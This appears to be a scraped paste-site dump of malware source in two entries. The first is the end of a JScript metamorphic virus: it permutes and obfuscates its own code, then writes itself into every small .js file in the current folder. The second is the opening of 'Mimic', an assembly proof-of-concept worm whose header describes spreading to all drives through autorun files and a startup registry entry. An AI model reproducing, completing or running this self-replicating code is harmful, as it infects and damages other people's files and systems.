id,title,username,language,date,content
    MetaLevelLanguage+='__(FPF040|FPF030)y°+FPFVPosArray+°.push(#x1#n0n#1x#)';
    MetaLevelLanguage+='__(FPF050|FPF040)xreturn(#x1°+FPFVPosArray+°1x#)';
                
            

MetaLevelLanguage+='__(2300|)function fCreateVarsAndFuncts(CVFOriginalCode)058';
    MetaLevelLanguage+='__(CVF0000|)var CVFTmpVarNames=#x1sVarNames.slice()1x#'; 
    MetaLevelLanguage+='__(CVF0100|CVF0010,CVF0000)while($#x1#O1sVarDefs#.length1O#1x#!#x2#n0n#2x#?>@)007';
        MetaLevelLanguage+='__(CVFa000|)var CVFNextPlace=#x1fCalculateFirstAppearance(#x2°+CVFOriginalCode+°2x#,#x3sVarNames[#n0n#]3x#)1x#';
        MetaLevelLanguage+='__(CVFa010|)var CVFCToIntegrate=#x1#x2sVarNames[#n0n#]2x#+#x3""=""3x#+#x4sVarDefs[#n0n#]4x#+#x5fGiveMeString(#n64n#)5x#+#x6fGiveMeString(#n59n#)6x#1x#';
        MetaLevelLanguage+='__(CVFa020|CVFa010)ysVarDefs.splice(#n0n#,#n1n#)';
        MetaLevelLanguage+='__(CVFa030|CVFa000,CVFa010)ysVarNames.splice(#n0n#,#n1n#)';
        MetaLevelLanguage+='__(CVFa040|CVFa000)var CVFVariablePosArray=#x1fFindPositionForCode(#x2°+CVFOriginalCode+°2x#,#x3°+CVFNextPlace+°3x#)1x#';
        MetaLevelLanguage+='__(CVFa050|CVFa040)var CVFNewPos=#x1°+CVFVariablePosArray+°[#x2fGiveRandomNumber(#x3#O1°+CVFVariablePosArray+°#.length1O#3x#)2x#]1x#';
        MetaLevelLanguage+='__(CVFa060|CVFa010,CVFa050)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.substring(#n0n#,#x2°+CVFNewPos+°2x#)1O#+ #x3°+CVFCToIntegrate+°3x# + #x4#O2°+CVFOriginalCode+°#.substring(#x5°+CVFNewPos+°5x#)2O#4x#1x#';      
    MetaLevelLanguage+='__(CVF0200|CVF0000)var CVFNumberOfArrays=#x1fGiveRandomNumber(#x2#O1°+CVFTmpVarNames+°#.length1O#/#n10n#2x#)1x#';
    MetaLevelLanguage+='__(CVF0300|CVF0210,CVF0100,CVF0200)while(var CVFindexk=#n0n#$#x1°+CVFindexk+°1x#!#x2°+CVFNumberOfArrays+°2x#?<@°+CVFindexk+°=°+CVFindexk+° +#n1n#)042';
        MetaLevelLanguage+='__(CVFa010|)var CVFRandNameArr=#x1fGiveRandomString()1x#';
        MetaLevelLanguage+='__(CVFa020|)yCVFTmpVarNames=#x1#O1°+CVFTmpVarNames+°#.sort(#x2fRandomizeFunction2x#)1O#1x#';
        MetaLevelLanguage+='__(CVFa030|)var CVFNumberOfArrayEntries=#x1fGiveRandomNumber(#x2#O1°+CVFTmpVarNames+°#.length1O#/#n3n#2x#)1x#';
        MetaLevelLanguage+='__(CVFa040|CVFa010)var CVFCodeToIntegrate=#x1°+CVFRandNameArr+°1x#';
        MetaLevelLanguage+='__(CVFa050|CVFa040)c+s(°+CVFCodeToIntegrate+°,#x1""=[""1x#)';      
        MetaLevelLanguage+='__(CVFa060|)var CVFArrayIndexCounter=#x1#n0n#1x#';
        MetaLevelLanguage+='__(CVFa070|CVFa020,CVFa030,CVFa050,CVFa060)while(var CVFcounti=#n0n#$#x1°+CVFcounti+°1x#!#x2°+CVFNumberOfArrayEntries+°2x#?<@°+CVFcounti+°=°+CVFcounti+° +#n1n#)033';
            MetaLevelLanguage+='__(CVFb010|)var CVFSearchArrayEntries1=#x1#O1°+CVFOriginalCode+°#.indexOf(#x2°+CVFTmpVarNames+°[#x3°+CVFcounti+°3x#]2x#)1O#1x#';
            MetaLevelLanguage+='__(CVFb020|CVFb010)if(#x1°+CVFSearchArrayEntries1+°1x#!#x2#n-1n#2x#?!=)030'; 
                MetaLevelLanguage+='__(CVFc010|)var CVFSearchArrayEntries2=°+CVFOriginalCode+°.indexOf(°+CVFTmpVarNames+°[°+CVFcounti+°],°+CVFSearchArrayEntries1+° +1)';                
                MetaLevelLanguage+='__(CVFc020|CVFc010)if(#x1°+CVFSearchArrayEntries2+°1x#!#x2#n-1n#2x#?!=)027';
                    MetaLevelLanguage+='__(CVFd010|)var CVFSearchArrayEntries3=#x1#O1°+CVFOriginalCode+°#.indexOf(#x2°+CVFTmpVarNames+°[#x3°+CVFcounti+°3x#]2x#,#x5#x4°+CVFSearchArrayEntries2+°4x# +#n1n#5x#)1O#1x#';
                    MetaLevelLanguage+='__(CVFd020|CVFd010)if(#x1°+CVFSearchArrayEntries3+°1x#!#x2#n-1n#2x#?==)024';
                        MetaLevelLanguage+='__(CVFe010|)var CVFSearchArrayEntries4=#x1#O1°+CVFOriginalCode+°#.indexOf(#x2#x3°+CVFTmpVarNames+°[#x4°+CVFcounti+°4x#]3x#+#""=""#2x#)1O#1x#';
                        MetaLevelLanguage+='__(CVFe020|CVFe010)var CVFVariableDefinition=#x1#O1°+CVFOriginalCode+°#.substring(#x2°+CVFSearchArrayEntries4+°2x# + #x3°+CVFTmpVarNames+°[#x4°+CVFcounti+°4x#].length+#n1n#3x#,#x5°+CVFOriginalCode+°.indexOf(#x6fGiveMeString(#n64n#)+fGiveMeString(#n59n#)6x#,#x7°+CVFSearchArrayEntries4+°7x#)5x#)1O#1x#';                        
                        MetaLevelLanguage+='__(CVFe030|CVFe020)if(#x1fGiveRandomNumber(#n4n#)1x#!#n3n#?<)014';
                            MetaLevelLanguage+='__(CVFf010|)c+s(°+CVFCodeToIntegrate+°,#x1#""funct""#1x#)';
                            MetaLevelLanguage+='__(CVFf020|CVFf010)c+s(°+CVFCodeToIntegrate+°,#x1#""ion(){retu""#1x#)';
                            MetaLevelLanguage+='__(CVFf030|CVFf020)c+s(°+CVFCodeToIntegrate+°,#x1#""rn ""#1x#)';         
                            MetaLevelLanguage+='__(CVFf040|CVFf030)c+s(°+CVFCodeToIntegrate+°,#x1°+CVFVariableDefinition+°1x#)';    
                            MetaLevelLanguage+='__(CVFf050|CVFf040)c+s(°+CVFCodeToIntegrate+°,#x1fGiveMeString(#n59n#)+fGiveMeString(#n125n#)+fGiveMeString(#n44n#)1x#)';  
                            MetaLevelLanguage+='__(CVFf060|)var CVFOldMarker=#x1#O1°+CVFOriginalCode+°#.search(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n88n#)4x#+#x5fGiveMeString(#n64n#)5x#2x#)1O#1x#';
                            MetaLevelLanguage+='__(CVFf070|CVFf060)var CVFRes1=#x1(#x2°+CVFOldMarker+°2x#>#x3°+CVFSearchArrayEntries4+°3x#||#x4°+CVFOldMarker+°4x#==#x5#n-1n#5x#)1x#';                            
                            MetaLevelLanguage+='__(CVFf080|CVFf070)if(#x1°+CVFRes1+°1x#!#x2true2x#?==)002';
                                MetaLevelLanguage+='__(CVFg010|)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n88n#)4x#+#x5fGiveMeString(#n64n#)5x#2x#,#""""#)1O#1x#';
                                MetaLevelLanguage+='__(CVFg020|CVFg010)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2°+CVFTmpVarNames+°[#x3°+CVFcounti+°3x#]2x#+#x4fGiveMeString(#n61n#)4x#+ #x5°+CVFVariableDefinition+°5x# +#x6fGiveMeString(#n64n#)+fGiveMeString(#n59n#)6x#,#x7fGiveMeString(#n64n#)+fGiveMeString(#n88n#)+fGiveMeString(#n64n#)7x#)1O#1x#';
                            MetaLevelLanguage+='__(CVFf090|)001';
                                MetaLevelLanguage+='__(CVFg010|)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2°+CVFTmpVarNames+°[#x4°+CVFcounti+°4x#]+#x5fGiveMeString(#n61n#)5x#+ #x6°+CVFVariableDefinition+°6x# +#x7fGiveMeString(#n64n#)+fGiveMeString(#n59n#)7x#2x#,#x3#""""#3x#)1O#1x#';                                
                            MetaLevelLanguage+='__(CVFf100|CVFf080)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2°+CVFTmpVarNames+°[#x4°+CVFcounti+°4x#]2x#,#x2#x3°+CVFRandNameArr+°3x# +#x5fGiveMeString(#n91n#)5x#+ #x6°+CVFArrayIndexCounter+°6x# +#x7fGiveMeString(#n93n#)+fGiveMeString(#n40n#)+fGiveMeString(#n41n#)7x#2x#)1O#1x#';
                            MetaLevelLanguage+='__(CVFf110|CVFf100)c+1(°+CVFArrayIndexCounter+°)';
                        MetaLevelLanguage+='__(CVFe040|)006';
                            MetaLevelLanguage+='__(CVFf010|)var CVFRandFuncName=#x1fGiveRandomString()1x#';
                            MetaLevelLanguage+='__(CVFf020|CVFf010)ysFunctionNames.push(#x1°+CVFRandFuncName+°1x#)';
                            MetaLevelLanguage+='__(CVFf030|)ysFunctionDefs.push(#x1#x2#""ret""#2x#+#x3#""urn ""#3x#+ #x4°+CVFVariableDefinition+°4x#1x#)';
                            MetaLevelLanguage+='__(CVFf040|)ysFunctionArgs.push(#x1#x2fGiveMeString(#n40n#)2x#+#x3fGiveMeString(#n41n#)3x#1x#)';
                            MetaLevelLanguage+='__(CVFf050|CVFf010)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x3°+CVFTmpVarNames+°[#x4°+CVFcounti+°4x#]3x#+#x5""=""5x#+ #x6°+CVFVariableDefinition+°6x# +#x7#x8fGiveMeString(#n64n#)8x#+#x9fGiveMeString(#n59n#)9x#7x#,#x2#""""#2x#)1O#1x#';
                            MetaLevelLanguage+='__(CVFf060|CVFf050)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2°+CVFTmpVarNames+°[#x3°+CVFcounti+°3x#]2x#,#x7#x4°+CVFRandFuncName+°4x# +#x5fGiveMeString(#n40n#)5x#+#x6fGiveMeString(#n41n#)6x#7x#)1O#1x#';                  
                    MetaLevelLanguage+='__(CVFd030|)000';
                MetaLevelLanguage+='__(CVFc030|)000';
            MetaLevelLanguage+='__(CVFb030|)000';        
        MetaLevelLanguage+='__(CVFa080|CVFa070)y°+CVFCodeToIntegrate+°=#x1#O1°+CVFCodeToIntegrate+°#.substring(#n0n#,#x2°+CVFCodeToIntegrate+°.length-#n1n#2x#)1O#+#""];""#1x#';       
        MetaLevelLanguage+='__(CVFa090|CVFa080)y°+CVFOriginalCode+°=#x1#O1°+CVFOriginalCode+°#.replace(#x2fGiveMeString(#n64n#)+fGiveMeString(#n88n#)+fGiveMeString(#n64n#)2x#,#x3°+CVFCodeToIntegrate+°3x#)1O#1x#'; 
    MetaLevelLanguage+='__(CVF0400|CVF0310,CVF0300)while(var CVFcountj=#n0n#$#x1°+CVFcountj+°1x#!#x2#O1sFunctionDefs#.length1O#2x#?<@°+CVFcountj+°=°+CVFcountj+° +#n1n#)003';    
        MetaLevelLanguage+='__(CVFa100|)var CVFPositionForIntegration=#x1fFindPositionForCode(#x2°+CVFOriginalCode+°2x#,#x3Infinity3x#)1x#';
        MetaLevelLanguage+='__(CVFa200|CVFa100)var CVFIntegrationPosition=#x1°+CVFPositionForIntegration+°[#x2fGiveRandomNumber(#x3#O1°+CVFPositionForIntegration+°#.length1O#3x#)2x#]1x#';
        MetaLevelLanguage+='__(CVFa300|CVFa200)y°+CVFOriginalCode+°=#x1#x2°+CVFOriginalCode+°.substring(#n0n#,#x3°+CVFIntegrationPosition+°3x#)2x#+#x4#""func""#4x#+#""tion ""#+#x6sFunctionNames[°+CVFcountj+°]6x#+#x7sFunctionArgs[°+CVFcountj+°]7x#+#x8fGiveMeString(#n64n#)+fGiveMeString(#n123n#)8x#+#x9sFunctionDefs[°+CVFcountj+°]+fGiveMeString(#n64n#)+fGiveMeString(#n125n#)+ #x5°+CVFOriginalCode+°.substring(°+CVFIntegrationPosition+°)5x#9x#1x#';
    MetaLevelLanguage+='__(CVF0500|CVF0400)xreturn(#x1°+CVFOriginalCode+°1x#)';                    
            
            
MetaLevelLanguage+='__(vvvic|MetaDef)victory:sMetaLevelLanguage=';
MetaLevelLanguage+='__(orgv|vvvic)def OriginalMetaCode=#x1sMetaLevelLanguage1x#';
MetaLevelLanguage+='__(o010|orgv)while($#x1#O1°+sMetaLevelLanguage+°#.indexOf(#x2fGiveMeString(#n58n#)+fGiveMeString(#n45n#)+fGiveMeString(#n41n#)2x#)1O#1x#!#n-1n#?!=@)002';
    MetaLevelLanguage+='__(o011|)y°+sMetaLevelLanguage+°=#x1#O1°+sMetaLevelLanguage+°#.replace(#x2fGiveMeString(#n58n#)+fGiveMeString(#n45n#)+fGiveMeString(#n41n#)2x#,#x3fGiveMeString(#n43n#)+fGiveMeString(#n176n#)3x#)1O#1x#';
    MetaLevelLanguage+='__(o012|)y°+sMetaLevelLanguage+°=#x1#O1°+sMetaLevelLanguage+°#.replace(#x2fGiveMeString(#n40n#)+fGiveMeString(#n45n#)+fGiveMeString(#n58n#)2x#,#x3fGiveMeString(#n176n#)+fGiveMeString(#n43n#)3x#)1O#1x#';    
MetaLevelLanguage+='__(2440|o010)def RndMetaName=#x1fGiveRandomString()1x#';
MetaLevelLanguage+='__(2450|o010,2440)while($#x1#O1sMetaLevelLanguage#.indexOf(#x3#""sMetaLevelLanguage""#3x#)1O#1x#!#x2#n-1n#2x#?!=@)001';
    MetaLevelLanguage+='__(001|)xsMetaLevelLanguage=#x1#O1sMetaLevelLanguage#.replace(#x2#""sMetaLevelLanguage""#2x#,#x3RndMetaName3x#)1O#1x#';
MetaLevelLanguage+='__(2400|2450,o010,PC1000,PC0800,VDef001,VDef002,VDef003,VDef004,VDef005,VDef006,VDef007,VDef008,VDef009,VDef010,VDef011,VDef012,VDef014)def sFullCodeArray=#x1#O1sMetaLevelLanguage#.split(#x2#x3fGiveMeString(#n95n#)3x#+#x4fGiveMeString(#n95n#)4x#2x#)1O#1x#';
MetaLevelLanguage+='__(2500|2400)def sPermCodeArray=#x1fPermutator(#x2#O1sFullCodeArray#.slice()1O#2x#)1x#';
MetaLevelLanguage+='__(2600|PC0800,PC1000,PC1100,VDef015,2500)def sNewCode=#x1fCreateBlockOfCode(#x2sPermCodeArray2x#)1x#';
MetaLevelLanguage+='__(2700|2600)ysFunctionNames.reverse()';
MetaLevelLanguage+='__(2800|2600)ysFunctionDefs.reverse()';
MetaLevelLanguage+='__(2900|2600)ysFunctionArgs.reverse()';
MetaLevelLanguage+='__(3000|2600)ysVarDefs.reverse()';
MetaLevelLanguage+='__(3100|2600)ysVarNames.reverse()';
MetaLevelLanguage+='__(3200|2700,2800,2900,3000,3100)def sFinalCode=#x1fCreateVarsAndFuncts(#x2sNewCode2x#)1x#';
MetaLevelLanguage+='__(3300|3200)while($#x1#O1sFinalCode#.indexOf(#x2#x3fGiveMeString(#n33n#)3x#+#x4fGiveMeString(#n64n#)4x#+#x5fGiveMeString(#n123n#)5x#2x#)1O#1x#!#n-1n#?!=@)001';
    MetaLevelLanguage+='__(A100|)ysFinalCode=#x1#O1sFinalCode#.replace(#x5#x2fGiveMeString(#n33n#)2x#+#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n123n#)4x#5x#,#x6#""""#6x#)1O#1x#';
MetaLevelLanguage+='__(3400|3200)while($#x1#O1sFinalCode#.indexOf(#x2#x3fGiveMeString(#n33n#)3x#+#x4fGiveMeString(#n64n#)4x#+#x5fGiveMeString(#n125n#)5x#2x#)1O#1x#!#n-1n#?!=@)001';
    MetaLevelLanguage+='__(A100|)ysFinalCode=#x1#O1sFinalCode#.replace(#x2#x3fGiveMeString(#n33n#)3x#+#x4fGiveMeString(#n64n#)4x#+#x5fGiveMeString(#n125n#)5x#2x#,#x6#""""#6x#)1O#1x#';
MetaLevelLanguage+='__(3500|3300)while($#x1#O1sFinalCode#.indexOf(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n123n#)4x#2x#)1O#1x#!#n-1n#?!=@)001';
    MetaLevelLanguage+='__(A100|)ysFinalCode=#x1#O1sFinalCode#.replace(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n123n#)4x#2x#,#x5fGiveMeString(#n123n#)5x#)1O#1x#';
MetaLevelLanguage+='__(3600|3400)while($#x1#O1sFinalCode#.indexOf(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n125n#)4x#2x#)1O#1x#!#n-1n#?!=@)001';
    MetaLevelLanguage+='__(A100|)ysFinalCode=#x1#O1sFinalCode#.replace(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n125n#)4x#2x#,#x5fGiveMeString(#n125n#)5x#)1O#1x#';
MetaLevelLanguage+='__(3700|3200)while($#x1#O1sFinalCode#.indexOf(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n59n#)4x#2x#)1O#1x#!#n-1n#?!=@)001';
    MetaLevelLanguage+='__(A100|)ysFinalCode=#x1#O1sFinalCode#.replace(#x2#x3fGiveMeString(#n64n#)3x#+#x4fGiveMeString(#n59n#)4x#2x#,#x5fGiveMeString(#n59n#)5x#)1O#1x#';

MetaLevelLanguage+='__(3800|3200)ysFinalCode=#x1fRemoveVariableMask(#x2sFinalCode2x#)1x#';
MetaLevelLanguage+='__(3900|3200)ysFinalCode=#x1fRemoveVariableIndicator(#x2sFinalCode2x#)1x#';

MetaLevelLanguage+='__(4100|)def sfso=#x1#O1WScript#.CreateObject(#x2#""Scripting.FileSystemObject""#2x#)1O#1x#';

MetaLevelLanguage+='__(5000|4100)def CurrentFolder=#x1#O1sfso#.GetFolder(#x2#"".""#2x#)1O#1x#';
MetaLevelLanguage+='__(5100|5000)def AllFiles=#x1#O1CurrentFolder#.Files1O#1x#';
MetaLevelLanguage+='__(5200|5100)def FilesC=#x1new Enumerator(#x2AllFiles2x#)1x#';
MetaLevelLanguage+='__(5300|5200)x#x1#O1FilesC#.moveFirst()1O#1x#';
MetaLevelLanguage+='__(5400|3500,3600,3700,3800,3900,5300)while($#x1#O1FilesC#.atEnd()1O#1x#!#x2false2x#?==@)014';
    MetaLevelLanguage+='__(NF10|)var FileName=#x1#O1FilesC#.item()1O#1x#';
    MetaLevelLanguage+='__(NF20|NF10)var FExt=#x1#O1sfso#.GetExtensionName(#x2°+FileName+°2x#)1O#1x#';
    MetaLevelLanguage+='__(NF30|NF20)if(#x1#O1°+FExt+°#.toUpperCase()1O#1x#!#x2#""JS""#2x#?==)009';        
        MetaLevelLanguage+='__(NFA10|)var hFileRead=#x1#O1sfso#.OpenTextFile(#x2°+FileName+°2x#,#x3#n1n#3x#)1O#1x#';
        MetaLevelLanguage+='__(NFA20|NFA10)var AllVictimData=#x1#O1°+hFileRead+°#.ReadAll()1O#1x#';
        MetaLevelLanguage+='__(NFA30|NFA20)x#x1#O1°+hFileRead+°#.close()1O#1x#';
        MetaLevelLanguage+='__(NFA50|NFA30)if(#x1#O1°+AllVictimData+°#.length1O#1x#!#x2#n150000n#2x#?<)004';
            MetaLevelLanguage+='__(NFB10|)var hFileWrite=#x1#O1sfso#.OpenTextFile(#x2°+FileName+°2x#,#x3#n2n#3x#)1O#1x#';        
            MetaLevelLanguage+='__(NFB20|)var NewVictimCode=#x1#x2sFinalCode2x#+#x3fGiveMeString(#n13n#)3x#+#x5fGiveMeString(#n10n#)5x#+ #x4°+AllVictimData+°4x#1x#';            
            MetaLevelLanguage+='__(NFB30|NFB10,NFB20)x#x1#O1°+hFileWrite+°#.Write(#x2°+NewVictimCode+°2x#)1O#1x#';
            MetaLevelLanguage+='__(NFB40|NFB30)x#x1#O1°+hFileWrite+°#.close()1O#1x#';   
        MetaLevelLanguage+='__(NFA60|)000';     
    MetaLevelLanguage+='__(NF31|)000';          
    MetaLevelLanguage+='__(NF40|NF10)y#x1#O1FilesC#.moveNext()1O#1x#';


OriginalMetaCode=MetaLevelLanguage;

PreCompilation();
WScript.Echo(""after Precompilation"")
FullCodeArray=MetaLevelLanguage.split('__');

PermCodeArray=Permutator(FullCodeArray.slice());
WScript.Echo(""after permutator"")
HierarchyOfCalls=0;
NewCode=CreateBlockOfCode(PermCodeArray);
WScript.Echo(""after CreateBlockOfCode""+nnn+""VarDefs: ""+VarDefs.length+nnn+""FunctionDefs: ""+FunctionDefs.length)
FunctionNames.reverse();
FunctionDefs.reverse();                          
FunctionArgs.reverse();
VarDefs.reverse();
VarNames.reverse();

FinalCode=CreateVarsAndFuncts(NewCode);
WScript.Echo(""after CreateVarsAndFuncts"")
FinalCode=FinalCode.replace(/!@}/g,'');
FinalCode=FinalCode.replace(/!@{/g,'');
FinalCode=FinalCode.replace(/@}/g,'}'+s(13)+s(10));
FinalCode=FinalCode.replace(/@{/g,'{'+s(13)+s(10));
FinalCode=FinalCode.replace(/@;/g,';'+s(13)+s(10));

FinalCode=RemoveVariableMask(FinalCode);
FinalCode=RemoveVariableIndicator(FinalCode);

WScript.Echo(FinalCode)

fso=WScript.CreateObject(""Scripting.FileSystemObject"");
file=fso.CreateTextFile('Transcript1.js');file.Write(FinalCode);file.close();"
Te3EvVEw,Mimc Proof-of-concept Worm Source Code,FlyFar,ASM (NASM),Tuesday 4th of July 2023 11:30:50 PM CDT,";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; Mimic
;; by Dr. Theodore Spankman
;; December 2010
;;
;;
;; This is a proof-of-concept worm for the technique descriped in an
;; article ""Code Mutations via Behaviour Analysis"".
;;
;; The main idea: The worm analyses the behaviour of its own code, then
;; creates random code and analyses that behaviour, too. If the behaviour
;; is the same, the original code will be substituated by the new ranom code.
;; It can analyse register operations, memory operations and stack operations.
;; For more information, see the article!
;;
;; The worm spreads via copying itself to all fixed and removeable drives,
;; creating an autostart file at removeable drives, and writing a registry
;; entry to start at every windows startup.
;;
;; The worm uses a simple 16bit hash-algorithm to find the APIs in the DLLs,
;; so no need to use hardcoded API names.
;;
;;
;;
;;
;; This is version 0.01, it is probably quite buggy - even I tried my best to
;; prevent that (within the given amount of time) - so dont blame me!
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


include '..\FASM\INCLUDE\win32ax.inc'

macro cc restr*, instr*, op1, op2
{
    ; Macro for padding commands to 8byte each and for
    ; adding the restrictions to the GlobalBehaviourTableList

    local StartCommand, EndCommand
    StartCommand:
    if op2 eq
	if op1 eq
	    instr
	else
	    instr op1
	end if
    else
	instr op1,op2
    end if
    EndCommand:
    times (8-EndCommand+StartCommand): nop	    ; padding

    match any, GlobalBehaviourTableList 	    ; Add further elements to list
    \{
	GlobalBehaviourTableList equ GlobalBehaviourTableList,restr
    \}

    match , GlobalBehaviourTableList		    ; Add first element to list
    \{
	GlobalBehaviourTableList equ restr
    \}
}

macro VEH_TRY c*
{
	cc rNoEmul,  call,    MirrorTheStack

	cc rPSI,     mov,     dword[sESP], esp

	cc rNoRes,   push,    VEH_Handler#c
	cc rNoRes,   push,    0x1
	cc rNoEmul,  stdcall, dword[AddVectoredExceptionHandler]
	cc rNoRes,   mov,     dword[hVEH], eax
}


macro VEH_EXCEPTION c*
{
	cc rNoEmul,  call,    RestoreTheStack
	cc rA,	     xor,     eax, eax
	cc rNoRes,   mov,     dword[bException#c], eax
	cc rNoEmul,  jmp,     VEH_NoException#c

     VEH_Handler#c:
	cc rA,	     mov,     eax, dword[hDataMirror]
	cc rAB,      mov,     ebx, dword[hDataMirror1]

	cc rF,	     cmp,     eax, ebx
	cc rNoEmul,  je,      VEH_HandlerDataMirrorOK#c
	cc rC,	     mov,     ecx, dword[hDataMirror2]
	cc rNoRes,   mov,     dword[hDataMirror], ecx

	VEH_HandlerDataMirrorOK#c:
	cc rNoEmul,  call,    RestoreTheMemory

	cc rNoEmul,  mov,     esp, dword[sESP]

	cc rABCDPSI, mov,     eax, 1
	cc rABCDPSI, mov,     dword[bException#c], eax
	cc rNoEmul,  call,    RestoreTheStack
}


macro VEH_END c*
{
     VEH_NoException#c:
	cc rA,	    mov,     eax, dword[hVEH]
	cc rNoRes,  push,    eax
	cc rNoEmul, stdcall, dword[RemoveVectoredExceptionHandler]
}


.data
DataStart:

	CodeStartInFile EQU 0x600

GlobalBehaviourTableList equ

; eax=A     ebp=P
; ebx=B     esi=S
; ecx=C     edi=I
; edx=D     FLAGS=F

rNoRes	  EQU 00000000b
rA	  EQU 00000001b
rB	  EQU 00000010b
rAB	  EQU 00000011b
rC	  EQU 00000100b
rAC	  EQU 00000101b
rBC	  EQU 00000110b
rABC	  EQU 00000111b
rD	  EQU 00001000b
rAD	  EQU 00001001b
rABD	  EQU 00001011b
rCD	  EQU 00001100b
rACD	  EQU 00001101b
rBCD	  EQU 00001110b
rABCD	  EQU 00001111b
rP	  EQU 00010000b
rAP	  EQU 00010001b
rBP	  EQU 00010010b
rCP	  EQU 00010100b
rDP	  EQU 00011000b
rCDP	  EQU 00011100b
rACP	  EQU 00010101b
rBCP	  EQU 00010110b
rADP	  EQU 00011001b
rBDP	  EQU 00011010b
rBCDP	  EQU 00011110b
rABCDP	  EQU 00011111b
rS	  EQU 00100000b
rAS	  EQU 00100001b
rBS	  EQU 00100010b
rABS	  EQU 00100011b
rCS	  EQU 00100100b
rACS	  EQU 00100101b
rBCS	  EQU 00100110b
rABCS	  EQU 00100111b
rDS	  EQU 00101000b
rADS	  EQU 00101001b
rCDS	  EQU 00101100b
rACDS	  EQU 00101101b
rABCDS	  EQU 00101111b
rPS	  EQU 00110000b
rBPS	  EQU 00110010b
rCPS	  EQU 00110100b
rACPS	  EQU 00110101b
rBCPS	  EQU 00110110b
